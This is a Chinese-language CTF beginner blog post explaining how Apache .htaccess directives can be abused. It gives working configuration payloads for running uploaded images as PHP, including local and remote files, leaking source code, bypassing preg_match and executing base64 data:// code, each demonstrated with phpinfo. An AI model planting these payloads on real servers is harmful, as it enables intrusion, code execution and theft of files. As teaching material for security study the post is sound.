<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>不要捉弄我新人同学: H - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="不要捉弄我新人同学: H - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://example.com/2023/03/02/%E4%B8%8D%E8%A6%81%E6%8D%89%E5%BC%84%E6%88%91%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6%EF%BC%9AH/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-02T09:43:34.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">不要捉弄我新人同学: H</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><h3 id="1-1基本概念"><a href="#1-1基本概念" class="headerlink" title="1.1基本概念"></a>1.1基本概念</h3><p><code>.htaccess</code> 文件提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一条或多条指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 <code>AllowOverride </code>指令来设置。<br>.htaccess 中有 <code>#</code> 单行注释符, 且支持 <code>\</code>拼接上下两行。</p>
<h3 id="1-2作用范围"><a href="#1-2作用范围" class="headerlink" title="1.2作用范围"></a>1.2作用范围</h3><p><code>.htaccess</code> 文件中的配置指令作用于 <code>.htaccess</code> 文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有<code>.htaccess</code>文件，而指令是按查找顺序依次生效的，所以一个特定目录下的<code> .htaccess</code> 文件中的指令可能会覆盖其上级目录中的 <code>.htaccess </code>文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。</p>
<h3 id="1-3配置文件"><a href="#1-3配置文件" class="headerlink" title="1.3配置文件"></a>1.3配置文件</h3><p>启动 .htaccess，需要在服务器的主配置文件将AllowOverride 设置为 All，如 apache2.conf<br><code>AllowOverride All  #启动.htaccess文件的使用</code><br>也可以将 .htaccess 修改为其他名<br><code>AccessFileName .config #将.htaccess修改为.config</code></p>
<h2 id="2-常见指令"><a href="#2-常见指令" class="headerlink" title="2.常见指令"></a>2.常见指令</h2><h3 id="2-1SetHandler"><a href="#2-1SetHandler" class="headerlink" title="2.1SetHandler"></a>2.1SetHandler</h3><p><code>SetHandler</code> 可以强制所有匹配的文件被一个指定的处理器处理<br>用法：<br><code>SetHandler handler-name|None</code><br>示例1：<br><code>SetHandler application/x-httpd-php</code><br>此时当前目录及其子目录下所有文件都会被当做 <code>php</code> 解析<br>示例2：<br><code>SetHandler server-status</code><br>这是查看apache的服务器信息的（默认是关闭状态，图源自网络）<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662385212373-d3a14c86-98fe-4db6-b7b7-c0e34b9ee712.png#averageHue=%23f4f2f0&clientId=ue1685f35-702a-4&from=paste&height=442&id=ubd0e82ce&name=image.png&originHeight=553&originWidth=1243&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79184&status=done&style=none&taskId=u4aa63535-d774-48d0-8c9f-433e4c16cd0&title=&width=994.4" alt="image.png"><br>访问任意不存在的文件，加参数 ?refresh&#x3D;5 来实现每隔 5s 自动刷新</p>
<h3 id="2-2AddHander-AddType"><a href="#2-2AddHander-AddType" class="headerlink" title="2.2AddHander,AddType"></a>2.2AddHander,AddType</h3><p>Example：</p>
<blockquote>
<p>AddType application&#x2F;x-httpd-php .htm<br>  #.htm后缀的文件视为php文件执行</p>
<p>AddHandler cgi-script .aaa<br>#后缀名为.aaa的文件视为cgi脚本执行</p>
<p>AddType application&#x2F;x-httpd-php png  jpg gif<br>#将png，jpg，gif后缀名都视为php执行</p>
</blockquote>
<p>可以看到以上三个指令作用基本一致，都是有很大的安全漏洞的，可以进行文件上传和包含漏洞</p>
<h3 id="2-3php-value"><a href="#2-3php-value" class="headerlink" title="2.3php_value"></a>2.3php_value</h3><p>当使用<code>PHP</code>作为<code>Apache</code>模块时，也可以用<code>Apache</code>的配置文件（例如 httpd.conf）和 <code>.htaccess </code>文件中的指令来修改 php 的配置设定。需要有<code>AllowOverride Options</code> 或<code>AllowOverride All </code>权限才可以。</p>
<p><code>php_value</code> 设定指定的值。要清除先前设定的值，把 value 设为 <code>none</code>。不要用 <code>php_value </code>设定布尔值。应该用 <code>php_flag</code>。</p>
<ul>
<li><p>用法：</p>
<pre><code>    `php_value name value`
</code></pre>
</li>
<li><p>使用的范围：</p>
</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662385734782-2c29c1d1-38bc-40bd-8825-12a9ccef2b1e.png#averageHue=%23eeeceb&clientId=ue1685f35-702a-4&from=paste&height=415&id=uca026b78&name=image.png&originHeight=519&originWidth=1317&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74469&status=done&style=none&taskId=u03a87285-6af5-4035-be5e-7ff830fc91f&title=&width=1053.6" alt="image.png"><br>由上可知<code>.htaccess</code>只能用于 <code>PHP_INI_ALL</code> 或 <code>PHP_INI_PERDIR </code>类型的指令。<br>查看php.ini 配置选项列表,寻找可利用指令</p>
<ol>
<li>文件包含配置选项</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662385800708-e59b5723-da0e-43e2-bf22-4579c24b1bbe.png#averageHue=%23efefee&clientId=ue1685f35-702a-4&from=paste&height=128&id=u672df9bb&name=image.png&originHeight=160&originWidth=1041&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20932&status=done&style=none&taskId=uddd23bef-1185-4eb8-9cb4-93baa2402a7&title=&width=832.8" alt="image.png"></p>
<ol>
<li>auto_prepend_file：在主文件解析之前自动解析包含的文件	</li>
<li>auto_append_file：在主文件解析后自动解析包含的文件</li>
</ol>
<p>如：<br><code>php_value auto_prepend_file 1.jpg</code> #每次访问一个<code>php</code>文件，都会先解析1.jpg图片，如果里面有代码就会执行</p>
<ol start="2">
<li>绕过preg_match</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662386088698-d232a1f1-c812-4343-81e9-93f985222407.png#averageHue=%23efefee&clientId=ue1685f35-702a-4&from=paste&height=479&id=u3c97774f&name=image.png&originHeight=599&originWidth=1294&originalType=binary&ratio=1&rotation=0&showTitle=false&size=77311&status=done&style=none&taskId=u1fe4a04e-ee10-411f-b291-9102ee05385&title=&width=1035.2" alt="image.png"><br>引例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure>
<p>将正则匹配的回溯次数设为0，来达到绕过的效果</p>
<h3 id="2-4php-flag"><a href="#2-4php-flag" class="headerlink" title="2.4php_flag"></a>2.4php_flag</h3><p><code>php_flag</code> 用来设定布尔值的 <code>php.ini</code> 配置指令<br>用法：<br>查看,寻找可利用指令<br><code>php_flag name on|off</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662386344558-6b0bf7bb-b50d-4072-9bfc-9c8cc9678ee1.png#averageHue=%23ededec&clientId=ue1685f35-702a-4&from=paste&height=380&id=uf7f21d27&name=image.png&originHeight=475&originWidth=1256&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67702&status=done&style=none&taskId=u0a686e57-2761-4473-982f-f00e6cf0bdd&title=&width=1004.8" alt="image.png"><br>将其中的engine设为0可以关闭php解析从而达到源码泄露的目的<br>如：<code>php_flag engine off</code></p>
<h3 id="2-5-htaccess文件的注释特征"><a href="#2-5-htaccess文件的注释特征" class="headerlink" title="2.5.htaccess文件的注释特征"></a>2.5.htaccess文件的注释特征</h3><p>在htaccess文件内注释符号是#，这里要注意#一般放在行首，并且只能注释一行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file 1.png</span><br><span class="line"># this is 注释</span><br></pre></td></tr></table></figure>
<p>假如我们要多行注释该怎么办呢，htaccess文件里面可以用反斜杠（%0a）转义换行符，去<code>连接</code>不同行的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le 1.png</span><br><span class="line"># this is 注释</span><br></pre></td></tr></table></figure>
<p>如例2，里面的<code>\</code>并不只是单单的<code>\</code>，他实际上是<code>\%0a、</code>，转义了换行符，所以我们根据这种特征，用<code>#\%0a</code>来多行注释</p>
<h2 id="3-Htaccess的利用方式"><a href="#3-Htaccess的利用方式" class="headerlink" title="3.Htaccess的利用方式"></a>3.Htaccess的利用方式</h2><h3 id="3-1文件解析"><a href="#3-1文件解析" class="headerlink" title="3.1文件解析"></a>3.1文件解析</h3><p>经常出现在文件上传的黑名单没有限制 <code>.htaceess</code> 后缀，通过上传 <code>.htaccess</code> 文件，再上传图片，使图片的<code>php</code>恶意代码得以被解析执行</p>
<p>使用方法有如下两种：</p>
<ul>
<li><p>sethandler：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 将test.gif 当做 PHP 执行</span><br><span class="line">&lt;FilesMatch  &quot;test.gif&quot;&gt;</span><br><span class="line">SetHandler  application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662391008636-69d51d2c-625a-47f0-8a91-dcaa39120437.png#averageHue=%23d9d9bd&clientId=ua05ca949-2e27-4&from=paste&height=532&id=u552c2e09&name=image.png&originHeight=665&originWidth=1355&originalType=binary&ratio=1&rotation=0&showTitle=false&size=90949&status=done&style=none&taskId=u3fc947b6-e2e5-45b0-b0ea-de9d49692ba&title=&width=1084" alt="image.png"></p>
</li>
<li><p>addtype:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 将 .jpg 当做 PHP 文件解析</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="3-2文件包含"><a href="#3-2文件包含" class="headerlink" title="3.2文件包含"></a>3.2文件包含</h3><h4 id="3-2-1本地文件包含（LFI）"><a href="#3-2-1本地文件包含（LFI）" class="headerlink" title="3.2.1本地文件包含（LFI）"></a>3.2.1本地文件包含（LFI）</h4><p>通过 <code>php_value</code> 来设置<code> auto_prepend_file</code>或者 <code>auto_append_file</code> 配置选项包含一些敏感文件, 同时在本目录或子目录中需要有可解析的 <code>php</code> 文件来触发。</p>
<p><code>.htaccess</code> 分别通过这两个配置选项来包含 <code>/etc/passwd</code>,并访问同目录下的 <code>index.php</code>文件。</p>
<ul>
<li>auto_prepend_file</li>
</ul>
<p><code>php_value auto_prepend_file C:\Users\22927\Desktop\新建文件夹\User_Pwds.txt</code><br>这个意思是当我们打开一个php文件之前，我们会先打开<code>User_Pwds.txt</code>文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662391115309-58488055-17b2-4421-b091-da784d49394e.png#averageHue=%23e5e0db&clientId=ua05ca949-2e27-4&from=paste&height=482&id=ud6466b89&name=image.png&originHeight=603&originWidth=1487&originalType=binary&ratio=1&rotation=0&showTitle=false&size=156755&status=done&style=none&taskId=ud686af78-a3a0-4596-bee8-84a5c5ca28a&title=&width=1189.6" alt="image.png"><br>可以看到我们的字典文件已经被打开了</p>
<ul>
<li>auto_append_file</li>
</ul>
<p><code>php_value auto_append_file C:\Users\22927\Desktop\新建文件夹\User_Pwds.txt</code><br>意思是在执行完一个php文件后，解析<code>User_Pwds.txt</code>文件<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662391150907-b17d5b6d-c734-48d5-a1f6-ed718e8c8222.png#averageHue=%23e6ba74&clientId=ua05ca949-2e27-4&from=paste&height=437&id=u275b7f0c&name=image.png&originHeight=546&originWidth=1509&originalType=binary&ratio=1&rotation=0&showTitle=false&size=154005&status=done&style=none&taskId=u97509de4-ef4e-4632-bcd6-6bf1f35f84b&title=&width=1207.2" alt="image.png"><br>如图，先输出了hello，再输出passwd</p>
<h4 id="3-2-2远程文件包含-RFI"><a href="#3-2-2远程文件包含-RFI" class="headerlink" title="3.2.2远程文件包含(RFI)"></a>3.2.2远程文件包含(RFI)</h4><p>PHP 的<code>all_url_include</code>配置选项这个选项默认是关闭的，如果开启的话就可以远程包含。因为<code>all_url_include</code>的配置范围为<code> PHP_INI_SYSTEM</code>,所以无法利用<code>php_flag</code>在<code>.htaccess</code>中开启<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662388115939-762db974-0786-4ecb-b611-77cd669f7a14.png#averageHue=%23f2f1f1&clientId=ue1685f35-702a-4&from=paste&height=113&id=u9fbdfd21&name=image.png&originHeight=141&originWidth=1422&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21412&status=done&style=none&taskId=u662e606b-f60c-4351-9b2d-8eb1c9b0969&title=&width=1137.6" alt="image.png"><br>因此想要运用就得将<code>all_url_include=on</code>开启<br>这里为了演示，就在 php.ini 中设置 all_url_include 为 On<br><code>php_value auto_append_file [http://10.87.9.156/phpinfo.txt](http://10.87.9.156/phpinfo.txt)</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662388141073-9c83b020-2b94-42cf-be57-574c6cdc6dc3.png#averageHue=%23425851&clientId=ue1685f35-702a-4&from=paste&height=378&id=u5a64f2d9&name=image.png&originHeight=473&originWidth=1408&originalType=binary&ratio=1&rotation=0&showTitle=false&size=99699&status=done&style=none&taskId=u112dc4d1-9523-4aba-9a6f-5bc36afc59d&title=&width=1126.4" alt="image.png"><br>可以看到先输出了hello再运行了phpinfo()；</p>
<h3 id="3-3信息泄露"><a href="#3-3信息泄露" class="headerlink" title="3.3信息泄露"></a>3.3信息泄露</h3><p>利用 <code>php_flag</code> 将 <code>engine </code>设置为<code> 0</code>,在本目录和子目录中关闭 php 解析,造成源码泄露<br><code>php_flag engine 0</code><br>这里在谷歌浏览器访问会显示源码，用其他浏览器访问会显示空白，还需查看源码，才可看到泄露的源码<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662391210050-17739589-a026-47c2-b724-a811c3fdb9bb.png#averageHue=%23155398&clientId=ua05ca949-2e27-4&from=paste&height=509&id=ued8d4c6c&name=image.png&originHeight=636&originWidth=719&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30118&status=done&style=none&taskId=uc4cd15f1-aec1-4a3e-9028-5c41b5ebf81&title=&width=575.2" alt="image.png"><br>可以看到直接给我们自动下载源文件了</p>
<h3 id="3-4代码执行"><a href="#3-4代码执行" class="headerlink" title="3.4代码执行"></a>3.4代码执行</h3><h4 id="3-4-1利用伪协议"><a href="#3-4-1利用伪协议" class="headerlink" title="3.4.1利用伪协议"></a>3.4.1利用伪协议</h4><p>前提条件：<code>all_url_fopen</code>&#x3D;on,<code>all_url_include</code>&#x3D;on</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br><span class="line"></span><br><span class="line">#PD9waHAgcGhwaW5mbygpOz8+=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662389116396-9c6ec88d-f536-461a-a0a8-ac58afdb2b88.png#averageHue=%23c5a26f&clientId=ue1685f35-702a-4&from=paste&height=429&id=u74ab072b&name=image.png&originHeight=536&originWidth=1817&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72499&status=done&style=none&taskId=u156dd935-e02d-4337-8ff1-012c03feef7&title=&width=1453.6" alt="image.png"><br>这边成功的打开了phpinfo！</p>
<h4 id="3-4-2解析-htaccess"><a href="#3-4-2解析-htaccess" class="headerlink" title="3.4.2解析.htaccess"></a>3.4.2解析.htaccess</h4><ul>
<li><p>方法一：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">#这里是注释哦！</span><br><span class="line">#&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
<p>这种方法在我们随便打开一个PHP文件后就会去解析.htaccess文件（这里的htaccess文件一定要和php文件在一个目录下！！！！）<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662389808497-890e8675-7462-41d7-b101-e8cf2317b833.png#averageHue=%23dedec0&clientId=ue1685f35-702a-4&from=paste&height=375&id=ue3e37ff5&name=image.png&originHeight=469&originWidth=1461&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73384&status=done&style=none&taskId=u29095ea4-9534-4d82-834a-e52018d1ae0&title=&width=1168.8" alt="image.png"></p>
</li>
<li><p>方法二：</p>
</li>
</ul>
<p>这种适合同目录或子目录没有<code>php</code>文件。<br>需要先设置允许可访问 <code>.htaccess</code> 文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ &quot;^.ht&quot;&gt;</span><br><span class="line"> Require all granted</span><br><span class="line"> Order allow,deny</span><br><span class="line"> Allow from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line">#这上面的代码必须加，是允许访问htaccess文件</span><br><span class="line">#下面的代码，将htaccess文件当成php文件处理</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"># &lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662390051808-4856c403-3557-484f-ac5d-dcc389602723.png#averageHue=%23e3dcb5&clientId=ue1685f35-702a-4&from=paste&height=386&id=uadd9ddb4&name=image.png&originHeight=483&originWidth=1442&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74346&status=done&style=none&taskId=u013c4f31-1924-44ff-94bf-ba320080b21&title=&width=1153.6" alt="image.png"></p>
<p>参考文献：<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8267#toc-20">https://xz.aliyun.com/t/8267#toc-20</a><br>不得不说这个博主真的牛</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/入门/" class="tag">#入门</a><a href="/tags/新人同学/" class="tag">#新人同学</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/02/%E4%B8%8D%E8%A6%81%E6%8D%89%E5%BC%84%E6%88%91%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6%EF%BC%9AS/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">不要捉弄我新人同学: S</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/02/%E4%B8%8D%E8%A6%81%E6%8D%89%E5%BC%84%E6%88%91%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6%EF%BC%9AF/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">不要捉弄我新人同学: F</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>